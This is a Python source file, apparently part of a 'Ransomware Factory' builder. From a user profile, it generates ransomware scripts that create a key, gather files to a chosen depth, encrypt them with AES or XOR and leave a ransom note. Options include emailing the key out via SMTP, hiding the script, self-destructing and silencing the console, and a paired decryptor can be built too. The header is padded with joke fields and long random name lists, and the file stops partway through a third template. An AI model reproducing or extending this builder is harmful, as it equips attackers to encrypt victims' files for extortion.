# Getting OS & Subprocess, time, and shutil, time, random, copy
import os
import subprocess
import time
import shutil
from datetime import datetime
import random
import copy

# Getting Data
from data import Data

class Create():
    def __init__(self, profile, GUI):
        # Getting profile
        self.profile = profile

        # Setting Up GUI
        self.GUI = GUI

        # Getting Code Data
        self.code_data = Data()
        self.code_data.parse_data()

        # Setting up code
        self.code = f"""#{self.profile}"""

    def get_args(self, window, bg_color, text_color):
        self.profile.file_name, self.profile.project_name = self.GUI.init_popup(window, self.profile, bg_color, text_color)

    def parse_imports(self):
        # Getting Temp Profile to stop tampering
        temp_prof = self.profile

        # Getting Starting Imports
        imports = ["import os", "import sys"]

        # Setting Imports Needed
        if temp_prof.storage_method == "ID File" or temp_prof.key_method == "Custom key":
            imports.append("import base64")
        if temp_prof.encryption_method == "AES" or temp_prof.key_method == "Fernet key":
            imports.append("from cryptography.fernet import Fernet")
        if temp_prof.key_method == "Secrets key":
            imports.append("import secrets")
        if temp_prof.hide_file == "Yes":
            imports.append("import platform")
            imports.append("import ctypes")
        if temp_prof.key_method == "Custom key":
            imports.append("import string")
            imports.append("import random")
        if temp_prof.message_type == "GUI Popup":
            imports.append("import webbrowser")
            imports.append("import tkinter as tk")
        if temp_prof.self_destruct == "Yes":
            imports.append("import time")
        if temp_prof.storage_method == "Email":
            imports.append("import smtplib")
            imports.append("from email.mime.text import MIMEText")
            imports.append("from email.mime.multipart import MIMEMultipart")

        # Setting it up as a string
        self.formatted_imports = ""
        for imp in imports:
            self.formatted_imports += imp + "\n"

    def parse_profile(self):
        # Getting temp profile to prevent self.profile tampering
        temp_prof = copy.deepcopy(self.profile)

        # Getting Special Run Commands
        self.special_commands = []
        if temp_prof.hide_file == "Yes":
            self.special_commands.append("        self.hide_self()")
        if temp_prof.self_destruct == "Yes":
            self.special_commands.append("        self.self_destruct()")
        self.added_commands = ""
        for line in self.special_commands:
            self.added_commands += line + "\n"

        # Setting File Vars
        if temp_prof.storage_method == "Email":
            self.storage_vars = f"sender_email = \"{temp_prof.from_email}\"\npassword = \"{temp_prof.from_password}\"\nreceiver_email = \"{temp_prof.to_email}\""
        else:
            self.storage_vars = ""

        # Setting up message vars
        if temp_prof.message_type == "Text File":
            self.message_left = f"instructions = \"\"\"{temp_prof.text_file}\"\"\""
        elif temp_prof.message_type == "GUI Popup":
            self.message_left = f"popup_type = {temp_prof.GUI_type}\ninstructions = {temp_prof.GUI_message}"
        else:
            self.message_left = ""

        # Getting Code Profile
        code_profile = temp_prof

        # Setting Arguements about it
        if self.profile.file_type == ".py":
            code_profile.file_type = ".py"
            self.usb = False
            self.exe = False
        elif self.profile.file_type == ".exe":
            code_profile.file_type = ".py"
            self.exe = True
            self.usb = False
        else:
            self.exe = True
            self.usb = True

        if self.profile.encryption_method == "AES":
            code_profile.encryption_method = self.code_data.encryption_data[0]
        else:
            code_profile.encryption_method = self.code_data.encryption_data[1]

        if self.profile.key_method == "Fernet key":
            code_profile.key_method = self.code_data.key_data[2]
        elif self.profile.key_method == "Secrets key":
            code_profile.key_method = self.code_data.key_data[1]
        else:
            code_profile.key_method = self.code_data.key_data[0]

        if self.profile.show_console == "No":
            code_profile.file_type = ".pyw"

        if self.profile.self_destruct == "Yes":
            code_profile.self_destruct = self.code_data.self_destruct[0]
        else:
            code_profile.self_destruct = "# Me No Die Today"

        self.decryption_get_key = self.code_data.get_key_data[2]
        if self.profile.storage_method == "Key File":
            code_profile.storage_method = self.code_data.storage_method[0]
            self.decryption_get_key = self.code_data.get_key_data[0]
        elif self.profile.storage_method == "ID File":
            code_profile.storage_method = self.code_data.storage_method[1]
            self.decryption_get_key = self.code_data.get_key_data[1]
        else:
            code_profile.storage_method = self.code_data.storage_method[2]

        if self.profile.message_type == "GUI Popup":
            code_profile.message_type = self.code_data.message_data[2]
        elif self.profile.message_type == "Text File":
            code_profile.message_type = self.code_data.message_data[1]
        else:
            code_profile.message_type = self.code_data.message_data[0]

        if self.profile.hide_file == "Yes":
            code_profile.hide_file = self.code_data.hide_data[0]
        else:
            code_profile.hide_file = ""

        if self.profile.encryption_depth == "All Below":
            code_profile.encryption_depth = self.code_data.files_data[0]
        elif self.profile.encryption_depth == "Current Dir":
            code_profile.encryption_depth = self.code_data.files_data[1]
        elif self.profile.encryption_depth == "Only Below":
            code_profile.encryption_depth = self.code_data.files_data[2]
        else:
            code_profile.encryption_depth = self.code_data.files_data[3]

        # Getting Pair Decryption Data
        self.decryption_function = self.code_data.decryption_data[0]
        if self.profile.encryption_method == "XOR":
            self.decryption_function = self.code_data.decryption_data[1]

        if self.profile.decryption_type == "One File (1)":
            self.decrypt_reverse_code = ""
        else:
            self.decrypt_reverse_code = """
            lines[2] = lines[2].replace("# DECRYPT", "# ENCRYPT")
            with open(filename, "w") as file:
                file.writelines(lines)"""

        # Shutting Off Output from console completley if needed
        if code_profile.file_type == ".pyw":
            self.console_code = "sys.stdout = open(os.devnull, 'w')\nsys.stderr = open(os.devnull, 'w')"
        else:
            self.console_code = str(random.randint(1,9))

        # Returning Code Profile
        self.code_profile = code_profile

    def create_code(self):
        code = f"""#!/usr/bin/env python3

  #######################
####### RANSOMWARE ########
######## FACTORY ##########
  #######################

#============================#
#    Created: {datetime.now()}
#    Happiness: {random.randint(1,100)} / 100
#    Anger: {random.choice(["None", "Small Bit", "Medium", "Half Angry", "Very Angry", "'Ima Nuke Japan' Angry", "I will explode"])}
#    Sentient: {random.choice(["No", "No", "No", "No", "No", "No", "No", "No", "No", "No", "No", "No", "No", "No", "No", "No", "No", "No", "No", "No", "Maybe", "Maybe", "Maybe", "Maybe", "Soon", "Soon", "Soon", "Soon", "Yes"])}
#    Attack: {random.randint(50, 250)}
#    Odds of Opening a random page: {random.randint(0, 99)}%
#    Rats in the basement: {random.randint(0,43)}
#    Number of eyes on it or me: {random.randint(1,1000000)}
#    Odds of Mercy: {random.randint(0,100)}%
#    Favorite Holiday: {random.choice(["Groundhog Day", "The Blitz", "Arbor Day", "Labor Day", "Columbus Day", "Veterans Day", "Black Friday", "Cyber Monday"])}
#    Favorite Day: {random.choice(["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"])}
#    World Ware III: {random.choice(["True", "False", "Soon", "Never"])}
#    Favorite Japanese holiday: {random.choice(["New Year's Day (Shogatsu) - January 1", "Coming of Age Day (Seijin no Hi) - Second Monday of January", "National Foundation Day (Kenkoku Kinen no Hi) - February 11", "Emperor's Birthday (Tennō Tanjōbi) - February 23 (February 24 in leap years)", "Vernal Equinox Day (Shunbun no Hi) - March 20-23", "Shōwa Day (Shōwa no Hi) - April 29", "Constitution Memorial Day (Kenpō Kinenbi) - May 3", "Greenery Day (Midori no Hi) - May 4", "Children's Day (Kodomo no Hi) - May 5", "Marine Day (Umi no Hi) - Third Monday of July", "Mountain Day (Yama no Hi) - August 11", "Respect for the Aged Day (Keirō no Hi) - Third Monday of September", "Autumnal Equinox Day (Shūbun no Hi) - September 23-26", "Health and Sports Day (Taiiku no Hi) - Second Monday of October", "Culture Day (Bunka no Hi) - November 3", "Labor Thanksgiving Day (Kinrō Kansha no Hi) - November 23", "The Emperor's Birthday (Tennō Tanjōbi) - December 23"])}
#    First Name: {random.choice(["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Charles", "Thomas", "Christopher", "Daniel", "Matthew", "Anthony", "Donald", "Mark", "Paul", "Steven", "Andrew", "Kenneth", "Joshua", "George", "Kevin", "Brian", "Edward", "Ronald", "Timothy", "Jason", "Jeffrey", "Ryan", "Jacob", "Gary", "Nicholas", "Eric", "Stephen", "Jonathan", "Larry", "Justin", "Scott", "Brandon", "Benjamin", "Samuel", "Gregory", "Frank", "Alexander", "Raymond", "Patrick", "Jack", "Dennis", "Jerry", "Tyler", "Aaron", "Jose", "Henry", "Douglas", "Adam", "Peter", "Nathan", "Zachary", "Walter", "Kyle", "Harold", "Carl", "Jeremy", "Keith", "Roger", "Gerald", "Ethan", "Arthur", "Terry", "Christian", "Sean", "Lawrence", "Austin", "Joe", "Noah", "Jesse", "Albert", "Bryan", "Billy", "Bruce", "Willie", "Jordan", "Dylan", "Alan", "Ralph", "Gabriel", "Roy", "Juan", "Wayne", "Eugene", "Logan", "Randy", "Louis", "Russell", "Vincent", "Philip", "Bobby", "Johnny", "Bradley", "Derek", "Martin", "Mason", "Dennis", "Howard", "Herman", "Preston", "Curtis", "Sean", "Nolan", "Floyd", "Leo", "Jared", "Warren", "Lewis", "Caleb", "Nathan", "Kurt", "Adrian", "Cory", "Julian", "Lance", "Cameron", "Victor", "Shane", "Marco", "Spencer", "Max", "Rodney", "Seth", "Dwayne", "Dwight", "Nelson", "Jasper", "Travis", "Garrett", "Jeffery", "Evan", "Devon", "Glen", "Clifford", "Mitchell", "Daryl", "Freddie", "Edwin", "Antonio", "Lucas", "Lloyd", "Dustin", "Sergio", "Tony", "Alex", "Felix", "Tommy", "Percy", "Levi", "Hugo", "Marc", "Dean", "Colin", "Edgar", "Gavin", "Xavier", "Aaron", "Graham", "Shawn", "Miguel", "Geoffrey", "Rodney", "Ricky", "Louis", "Bryce", "Dominic", "Jorge", "Don", "Mathew", "Brady", "Todd", "Karl", "Neil", "Dylan", "Rocky", "Chester", "Wesley", "Wendell", "Sam", "Sylvester", "Trevor", "Greg", "Manuel", "Eddie", "Reginald", "Harvey", "Alfred", "Tyrone", "Orville", "Clyde", "Clayton", "Stanley", "Frederick", "Joey", "Rick", "Randall", "Barry", "Bernard", "Leroy", "Milton", "Isaac", "Wallace", "Ruben", "Ivan", "Todd", "Darnell", "Arturo", "Terrance", "Roderick", "Marco", "Nathaniel", "Simon", "Jimmie", "Monte", "Hector", "Pete", "Tom", "Otis", "Willard", "Troy", "Nathaniel", "Earnest", "Nick", "Guillermo", "Wilson", "Maxwell", "Rodolfo", "Irving", "Conrad", "Cary", "Alvin", "Douglas", "Arnold", "Allen", "Rufus", "Elmer", "Agustin", "Kirk", "Damon", "Devin", "Juan", "Adrian", "Fernando", "Jerald", "Royce", "Terrence", "Enrique", "Lorenzo", "Spencer", "Ernesto", "Javier", "Kendall", "Jacques", "Santiago", "Malcolm", "Floyd", "Everett", "Dante", "Elliott", "Virgil", "Tomas", "Jessie", "Dominick", "Dana", "Winston", "Roland", "Sherman", "Solomon", "Gregg", "Reuben", "Ramiro", "Chance", "Arnold", "Wade", "Edmond", "Ed", "Donovan", "Antoine", "Randal", "Lamar", "Jess", "Sammie", "Leonardo", "Russel"])}
#    Last Name: {random.choice(["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Jackson", "Martin", "Lee", "Perez", "Thompson", "White", "Harris", "Sanchez", "Clark", "Ramirez", "Lewis", "Robinson", "Walker", "Young", "Allen", "King", "Wright", "Scott", "Torres", "Nguyen", "Hill", "Flores", "Green", "Adams", "Nelson", "Baker", "Hall", "Rivera", "Campbell", "Mitchell", "Carter", "Roberts", "Gomez", "Phillips", "Evans", "Turner", "Diaz", "Parker", "Cruz", "Edwards", "Collins", "Reyes", "Stewart", "Morris", "Morales", "Murphy", "Cook", "Rogers", "Gutierrez", "Ortiz", "Morgan", "Cooper", "Peterson", "Bailey", "Reed", "Kelly", "Howard", "Ramos", "Kim", "Cox", "Ward", "Richardson", "Watson", "Brooks", "Chavez", "Wood", "James", "Bennett", "Gray", "Mendoza", "Ruiz", "Hughes", "Price", "Alvarez", "Castillo", "Sanders", "Patel", "Myers", "Long", "Ross", "Foster", "Jimenez", "Powell", "Jenkins", "Perry", "Russell", "Sullivan", "Bell", "Coleman", "Butler", "Henderson", "Barnes", "Gonzales", "Fisher", "Vasquez", "Simmons", "Romero", "Jordan", "Patterson", "Alexander", "Hamilton", "Graham", "Reynolds", "Griffin", "Wallace", "Moreno", "West", "Cole", "Hayes", "Bryant", "Herrera", "Gibson", "Ellis", "Tran", "Medina", "Aguilar", "Stevens", "Murray", "Ford", "Castro", "Marshall", "Owens", "Harrison", "Fernandez", "Mcdonald", "Woods", "Washington", "Kennedy", "Wells", "Vargas", "Henry", "Chen", "Freeman", "Webb", "Tucker", "Guzman", "Burns", "Crawford", "Olson", "Simpson", "Porter", "Hunter", "Gordon", "Mendez", "Silva", "Shaw", "Snyder", "Mason", "Dixon", "Munoz", "Hunt", "Hicks", "Holmes", "Palmer", "Wagner", "Black", "Robertson", "Boyd", "Rose", "Stone", "Salazar", "Fox", "Warren", "Mills", "Meyer", "Rice", "Schmidt", "Garza", "Daniels", "Ferguson", "Nichols", "Stephens", "Soto", "Weaver", "Ryan", "Gardner", "Payne", "Grant", "Dunn", "Kelley", "Spencer", "Hawkins", "Arnold", "Pierce", "Vazquez", "Hansen", "Peters", "Santos", "Hart", "Bradley", "Knight", "Elliott", "Cunningham", "Duncan", "Armstrong", "Hudson", "Carroll", "Lane", "Riley", "Andrews", "Alvarado", "Ray", "Delgado", "Berry", "Perkins", "Hoffman", "Johnston", "Matthews", "Pena", "Richards", "Contreras", "Willis", "Carpenter", "Lawrence", "Sandoval", "Guerrero", "George", "Chapman", "Rios", "Estrada", "Ortega", "Watkins", "Greene", "Nunez", "Wheeler", "Valdez", "Harper", "Burke", "Larson", "Santiago", "Maldonado", "Morrison", "Franklin", "Carlson", "Austin", "Dominguez", "Carr", "Lawson", "Jacobs", "Obrien", "Lynch", "Singh", "Vega", "Bishop", "Montgomery", "Oliver", "Jensen", "Harvey", "Williamson", "Gilbert", "Dean", "Sims", "Espinoza", "Howell", "Li", "Wong", "Reid", "Hanson", "Le", "Mccoy", "Garrett", "Burton", "Fuller", "Wang", "Weber", "Welch", "Rojas", "Lucas", "Marquez", "Fields", "Park", "Yang", "Little", "Banks", "Padilla", "Day", "Walsh", "Bowman", "Schultz", "Luna", "Fowler", "Mejia", "Davidson", "Acosta", "Brewer", "May", "Holland", "Juarez", "Newman", "Pearson", "Curtis", "Cortez", "Douglas", "Schneider", "Joseph", "Barrett", "Navarro", "Figueroa", "Keller", "Avila", "Wade", "Molina", "Stanley", "Hopkins", "Campos", "Barnett", "Bates", "Chambers", "Caldwell", "Beck", "Lambert", "Miranda", "Byrd", "Craig", "Ayala", "Lowe", "Frazier", "Powers", "Neal", "Leonard", "Gregory", "Carrillo", "Sutton", "Fleming", "Rhodes", "Shelton", "Schwartz", "Norris", "Jennings", "Watts", "Duran", "Walters", "Cohen", "Mcdaniel", "Moran", "Parks", "Steele", "Vaughn", "Becker", "Holt", "Deleon", "Barker", "Terry", "Hale", "Leon", "Hail", "Benson", "Haynes", "Horton", "Miles", "Lyons", "Pham", "Graves", "Bush", "Thornton", "Wolfe", "Warner", "Caballero", "Mckinney", "Mann", "Zimmerman", "Dawson", "Lara", "Fletcher", "Page", "Mccarthy", "Love", "Robles", "Cervantes", "Solis", "Erickson", "Reeves", "Chang", "Klein", "Salinas", "Fuentes", "Baldwin", "Daniel", "Simon", "Velasquez", "Hardy", "Higgins", "Aguirre", "Lin", "Cummings", "Chandler", "Sharp", "Barber", "Bowen", "Ochoa", "Dennis", "Robbins", "Liu", "Ramsey", "Francis", "Griffith", "Paul", "Blair", "Oconnor", "Cardenas", "Pacheco", "Cross", "Calderon", "Quinn", "Moss", "Swanson", "Chan", "Rivas", "Khan", "Dyer", "Armstrong", "Avery", "Carpenter", "Reilly", "Mcfarland", "Hays", "Church", "Coffey", "Cowan", "Bhat", "Pritchard"])}
#============================#

{self.formatted_imports}
# ==== They ===== Speak ==== #
{self.message_left} # Don't
{self.storage_vars} # They?
# ==== Speak ===== They ==== #

{self.console_code}

class Ransomware:
    def __init__(self, name, file):
        self.name = name
        self.file = file
        self.key = \"Key soon to be <3\"
        self.files = []

    {self.code_profile.key_method}

    {self.code_profile.storage_method}

    {self.code_profile.encryption_method}

    {self.code_profile.encryption_depth}

    {self.code_profile.message_type}

    {self.code_data.all_data[0]}

    {self.code_profile.hide_file}

    {self.code_profile.self_destruct}

    def run(self):
        print("Main: Main started at" , str(os.path.abspath(sys.argv[0])))
        self.create_key()
        self.get_files()
        self.encrypt_files()
        self.leave_message()
        self.save_key()
{self.added_commands}
if __name__ == \"__main__\":
    ransomware = Ransomware(__name__, sys.argv[0])
    ransomware.run()
        """
        self.code = code

        if self.profile.decryption_type == "Pair":
            self.decryption_code = f"""#!/usr/bin/env python3

  #######################
####### RANSOMWARE ########
######## FACTORY ##########
  #######################

#============================#
#    Created: {datetime.now()}
#    Happiness: {random.randint(1,100)} / 100
#    Anger: {random.choice(["None", "Small Bit", "Medium", "Half Angry", "Very Angry", "'Ima Nuke Japan' Angry", "I will explode"])}
#    Sentient: {random.choice(["No", "No", "No", "No", "No", "No", "No", "No", "No", "No", "No", "No", "No", "No", "No", "No", "No", "No", "No", "No", "Maybe", "Maybe", "Maybe", "Maybe", "Soon", "Soon", "Soon", "Soon", "Yes"])}
#    Attack: {random.randint(50, 250)}
#    Odds of Opening a random page: {random.randint(0, 99)}%
#    Rats in the basement: {random.randint(0,43)}
#    Number of eyes on it or me: {random.randint(1,1000000)}
#    Odds of Mercy: {random.randint(0,100)}%
#    Favorite Holiday: {random.choice(["Groundhog Day", "The Blitz", "Arbor Day", "Labor Day", "Columbus Day", "Veterans Day", "Black Friday", "Cyber Monday"])}
#    Favorite Day: {random.choice(["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"])}
#    World Ware III: {random.choice(["True", "False", "Soon", "Never"])}
#    Favorite Japanese holiday: {random.choice(["New Year's Day (Shogatsu) - January 1", "Coming of Age Day (Seijin no Hi) - Second Monday of January", "National Foundation Day (Kenkoku Kinen no Hi) - February 11", "Emperor's Birthday (Tennō Tanjōbi) - February 23 (February 24 in leap years)", "Vernal Equinox Day (Shunbun no Hi) - March 20-23", "Shōwa Day (Shōwa no Hi) - April 29", "Constitution Memorial Day (Kenpō Kinenbi) - May 3", "Greenery Day (Midori no Hi) - May 4", "Children's Day (Kodomo no Hi) - May 5", "Marine Day (Umi no Hi) - Third Monday of July", "Mountain Day (Yama no Hi) - August 11", "Respect for the Aged Day (Keirō no Hi) - Third Monday of September", "Autumnal Equinox Day (Shūbun no Hi) - September 23-26", "Health and Sports Day (Taiiku no Hi) - Second Monday of October", "Culture Day (Bunka no Hi) - November 3", "Labor Thanksgiving Day (Kinrō Kansha no Hi) - November 23", "The Emperor's Birthday (Tennō Tanjōbi) - December 23"])}
#    First Name: {random.choice(["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Charles", "Thomas", "Christopher", "Daniel", "Matthew", "Anthony", "Donald", "Mark", "Paul", "Steven", "Andrew", "Kenneth", "Joshua", "George", "Kevin", "Brian", "Edward", "Ronald", "Timothy", "Jason", "Jeffrey", "Ryan", "Jacob", "Gary", "Nicholas", "Eric", "Stephen", "Jonathan", "Larry", "Justin", "Scott", "Brandon", "Benjamin", "Samuel", "Gregory", "Frank", "Alexander", "Raymond", "Patrick", "Jack", "Dennis", "Jerry", "Tyler", "Aaron", "Jose", "Henry", "Douglas", "Adam", "Peter", "Nathan", "Zachary", "Walter", "Kyle", "Harold", "Carl", "Jeremy", "Keith", "Roger", "Gerald", "Ethan", "Arthur", "Terry", "Christian", "Sean", "Lawrence", "Austin", "Joe", "Noah", "Jesse", "Albert", "Bryan", "Billy", "Bruce", "Willie", "Jordan", "Dylan", "Alan", "Ralph", "Gabriel", "Roy", "Juan", "Wayne", "Eugene", "Logan", "Randy", "Louis", "Russell", "Vincent", "Philip", "Bobby", "Johnny", "Bradley", "Derek", "Martin", "Mason", "Dennis", "Howard", "Herman", "Preston", "Curtis", "Sean", "Nolan", "Floyd", "Leo", "Jared", "Warren", "Lewis", "Caleb", "Nathan", "Kurt", "Adrian", "Cory", "Julian", "Lance", "Cameron", "Victor", "Shane", "Marco", "Spencer", "Max", "Rodney", "Seth", "Dwayne", "Dwight", "Nelson", "Jasper", "Travis", "Garrett", "Jeffery", "Evan", "Devon", "Glen", "Clifford", "Mitchell", "Daryl", "Freddie", "Edwin", "Antonio", "Lucas", "Lloyd", "Dustin", "Sergio", "Tony", "Alex", "Felix", "Tommy", "Percy", "Levi", "Hugo", "Marc", "Dean", "Colin", "Edgar", "Gavin", "Xavier", "Aaron", "Graham", "Shawn", "Miguel", "Geoffrey", "Rodney", "Ricky", "Louis", "Bryce", "Dominic", "Jorge", "Don", "Mathew", "Brady", "Todd", "Karl", "Neil", "Dylan", "Rocky", "Chester", "Wesley", "Wendell", "Sam", "Sylvester", "Trevor", "Greg", "Manuel", "Eddie", "Reginald", "Harvey", "Alfred", "Tyrone", "Orville", "Clyde", "Clayton", "Stanley", "Frederick", "Joey", "Rick", "Randall", "Barry", "Bernard", "Leroy", "Milton", "Isaac", "Wallace", "Ruben", "Ivan", "Todd", "Darnell", "Arturo", "Terrance", "Roderick", "Marco", "Nathaniel", "Simon", "Jimmie", "Monte", "Hector", "Pete", "Tom", "Otis", "Willard", "Troy", "Nathaniel", "Earnest", "Nick", "Guillermo", "Wilson", "Maxwell", "Rodolfo", "Irving", "Conrad", "Cary", "Alvin", "Douglas", "Arnold", "Allen", "Rufus", "Elmer", "Agustin", "Kirk", "Damon", "Devin", "Juan", "Adrian", "Fernando", "Jerald", "Royce", "Terrence", "Enrique", "Lorenzo", "Spencer", "Ernesto", "Javier", "Kendall", "Jacques", "Santiago", "Malcolm", "Floyd", "Everett", "Dante", "Elliott", "Virgil", "Tomas", "Jessie", "Dominick", "Dana", "Winston", "Roland", "Sherman", "Solomon", "Gregg", "Reuben", "Ramiro", "Chance", "Arnold", "Wade", "Edmond", "Ed", "Donovan", "Antoine", "Randal", "Lamar", "Jess", "Sammie", "Leonardo", "Russel"])}
#    Last Name: {random.choice(["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Jackson", "Martin", "Lee", "Perez", "Thompson", "White", "Harris", "Sanchez", "Clark", "Ramirez", "Lewis", "Robinson", "Walker", "Young", "Allen", "King", "Wright", "Scott", "Torres", "Nguyen", "Hill", "Flores", "Green", "Adams", "Nelson", "Baker", "Hall", "Rivera", "Campbell", "Mitchell", "Carter", "Roberts", "Gomez", "Phillips", "Evans", "Turner", "Diaz", "Parker", "Cruz", "Edwards", "Collins", "Reyes", "Stewart", "Morris", "Morales", "Murphy", "Cook", "Rogers", "Gutierrez", "Ortiz", "Morgan", "Cooper", "Peterson", "Bailey", "Reed", "Kelly", "Howard", "Ramos", "Kim", "Cox", "Ward", "Richardson", "Watson", "Brooks", "Chavez", "Wood", "James", "Bennett", "Gray", "Mendoza", "Ruiz", "Hughes", "Price", "Alvarez", "Castillo", "Sanders", "Patel", "Myers", "Long", "Ross", "Foster", "Jimenez", "Powell", "Jenkins", "Perry", "Russell", "Sullivan", "Bell", "Coleman", "Butler", "Henderson", "Barnes", "Gonzales", "Fisher", "Vasquez", "Simmons", "Romero", "Jordan", "Patterson", "Alexander", "Hamilton", "Graham", "Reynolds", "Griffin", "Wallace", "Moreno", "West", "Cole", "Hayes", "Bryant", "Herrera", "Gibson", "Ellis", "Tran", "Medina", "Aguilar", "Stevens", "Murray", "Ford", "Castro", "Marshall", "Owens", "Harrison", "Fernandez", "Mcdonald", "Woods", "Washington", "Kennedy", "Wells", "Vargas", "Henry", "Chen", "Freeman", "Webb", "Tucker", "Guzman", "Burns", "Crawford", "Olson", "Simpson", "Porter", "Hunter", "Gordon", "Mendez", "Silva", "Shaw", "Snyder", "Mason", "Dixon", "Munoz", "Hunt", "Hicks", "Holmes", "Palmer", "Wagner", "Black", "Robertson", "Boyd", "Rose", "Stone", "Salazar", "Fox", "Warren", "Mills", "Meyer", "Rice", "Schmidt", "Garza", "Daniels", "Ferguson", "Nichols", "Stephens", "Soto", "Weaver", "Ryan", "Gardner", "Payne", "Grant", "Dunn", "Kelley", "Spencer", "Hawkins", "Arnold", "Pierce", "Vazquez", "Hansen", "Peters", "Santos", "Hart", "Bradley", "Knight", "Elliott", "Cunningham", "Duncan", "Armstrong", "Hudson", "Carroll", "Lane", "Riley", "Andrews", "Alvarado", "Ray", "Delgado", "Berry", "Perkins", "Hoffman", "Johnston", "Matthews", "Pena", "Richards", "Contreras", "Willis", "Carpenter", "Lawrence", "Sandoval", "Guerrero", "George", "Chapman", "Rios", "Estrada", "Ortega", "Watkins", "Greene", "Nunez", "Wheeler", "Valdez", "Harper", "Burke", "Larson", "Santiago", "Maldonado", "Morrison", "Franklin", "Carlson", "Austin", "Dominguez", "Carr", "Lawson", "Jacobs", "Obrien", "Lynch", "Singh", "Vega", "Bishop", "Montgomery", "Oliver", "Jensen", "Harvey", "Williamson", "Gilbert", "Dean", "Sims", "Espinoza", "Howell", "Li", "Wong", "Reid", "Hanson", "Le", "Mccoy", "Garrett", "Burton", "Fuller", "Wang", "Weber", "Welch", "Rojas", "Lucas", "Marquez", "Fields", "Park", "Yang", "Little", "Banks", "Padilla", "Day", "Walsh", "Bowman", "Schultz", "Luna", "Fowler", "Mejia", "Davidson", "Acosta", "Brewer", "May", "Holland", "Juarez", "Newman", "Pearson", "Curtis", "Cortez", "Douglas", "Schneider", "Joseph", "Barrett", "Navarro", "Figueroa", "Keller", "Avila", "Wade", "Molina", "Stanley", "Hopkins", "Campos", "Barnett", "Bates", "Chambers", "Caldwell", "Beck", "Lambert", "Miranda", "Byrd", "Craig", "Ayala", "Lowe", "Frazier", "Powers", "Neal", "Leonard", "Gregory", "Carrillo", "Sutton", "Fleming", "Rhodes", "Shelton", "Schwartz", "Norris", "Jennings", "Watts", "Duran", "Walters", "Cohen", "Mcdaniel", "Moran", "Parks", "Steele", "Vaughn", "Becker", "Holt", "Deleon", "Barker", "Terry", "Hale", "Leon", "Hail", "Benson", "Haynes", "Horton", "Miles", "Lyons", "Pham", "Graves", "Bush", "Thornton", "Wolfe", "Warner", "Caballero", "Mckinney", "Mann", "Zimmerman", "Dawson", "Lara", "Fletcher", "Page", "Mccarthy", "Love", "Robles", "Cervantes", "Solis", "Erickson", "Reeves", "Chang", "Klein", "Salinas", "Fuentes", "Baldwin", "Daniel", "Simon", "Velasquez", "Hardy", "Higgins", "Aguirre", "Lin", "Cummings", "Chandler", "Sharp", "Barber", "Bowen", "Ochoa", "Dennis", "Robbins", "Liu", "Ramsey", "Francis", "Griffith", "Paul", "Blair", "Oconnor", "Cardenas", "Pacheco", "Cross", "Calderon", "Quinn", "Moss", "Swanson", "Chan", "Rivas", "Khan", "Dyer", "Armstrong", "Avery", "Carpenter", "Reilly", "Mcfarland", "Hays", "Church", "Coffey", "Cowan", "Bhat", "Pritchard"])}
#============================#

{self.formatted_imports}
# ==== They ===== Speak ==== #
{self.message_left} # Don't
{self.storage_vars} # They?
# ==== Speak ===== They ==== #

{self.console_code}

class Ransomware:
    def __init__(self, name, file):
        self.name = name
        self.file = file
        self.key = \"Key soon to be <3\"
        self.files = []

    {self.decryption_get_key}

    {self.decryption_function}

    {self.code_profile.encryption_depth}

    {self.code_data.all_data[1]}

    {self.code_profile.hide_file}

    {self.code_profile.self_destruct}

    def run(self):
        print("Main: Main started at" , str(os.path.abspath(sys.argv[0])))
        self.get_key()
        self.get_files()
        self.decrypt_files()
{self.added_commands}
if __name__ == \"__main__\":
    ransomware = Ransomware(__name__, sys.argv[0])
    ransomware.run()
        """

        else:
            self.code = f"""#!/usr/bin/env python3

# ENCRYPT

  #######################
####### RANSOMWARE ########
######## FACTORY ##########
  #######################

#============================#
#    Created: {datetime.now()}
#    Happiness: {random.randint(1,100)} / 100
#    Anger: {random.choice(["None", "Small Bit", "Medium", "Half Angry", "Very Angry", "'Ima Nuke Japan' Angry", "I will explode"])}
#    Sentient: {random.choice(["No", "No", "No", "No", "No", "No", "No", "No", "No", "No", "No", "No", "No", "No", "No", "No", "No", "No", "No", "No", "Maybe", "Maybe", "Maybe", "Maybe", "Soon", "Soon", "Soon", "Soon", "Yes"])}
#    Attack: {random.randint(50, 250)}
#    Odds of Opening a random page: {random.randint(0, 99)}%
#    Rats in the basement: {random.randint(0,43)}
#    Number of eyes on it or me: {random.randint(1,1000000)}
#    Odds of Mercy: {random.randint(0,100)}%
#    Favorite Holiday: {random.choice(["Groundhog Day", "The Blitz", "Arbor Day", "Labor Day", "Columbus Day", "Veterans Day", "Black Friday", "Cyber Monday"])}
#    Favorite Day: {random.choice(["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"])}
#    World Ware III: {random.choice(["True", "False", "Soon", "Never"])}
#    Favorite Japanese holiday: {random.choice(["New Year's Day (Shogatsu) - January 1", "Coming of Age Day (Seijin no Hi) - Second Monday of January", "National Foundation Day (Kenkoku Kinen no Hi) - February 11", "Emperor's Birthday (Tennō Tanjōbi) - February 23 (February 24 in leap years)", "Vernal Equinox Day (Shunbun no Hi) - March 20-23", "Shōwa Day (Shōwa no Hi) - April 29", "Constitution Memorial Day (Kenpō Kinenbi) - May 3", "Greenery Day (Midori no Hi) - May 4", "Children's Day (Kodomo no Hi) - May 5", "Marine Day (Umi no Hi) - Third Monday of July", "Mountain Day (Yama no Hi) - August 11", "Respect for the Aged Day (Keirō no Hi) - Third Monday of September", "Autumnal Equinox Day (Shūbun no Hi) - September 23-26", "Health and Sports Day (Taiiku no Hi) - Second Monday of October", "Culture Day (Bunka no Hi) - November 3", "Labor Thanksgiving Day (Kinrō Kansha no Hi) - November 23", "The Emperor's Birthday (Tennō Tanjōbi) - December 23"])}
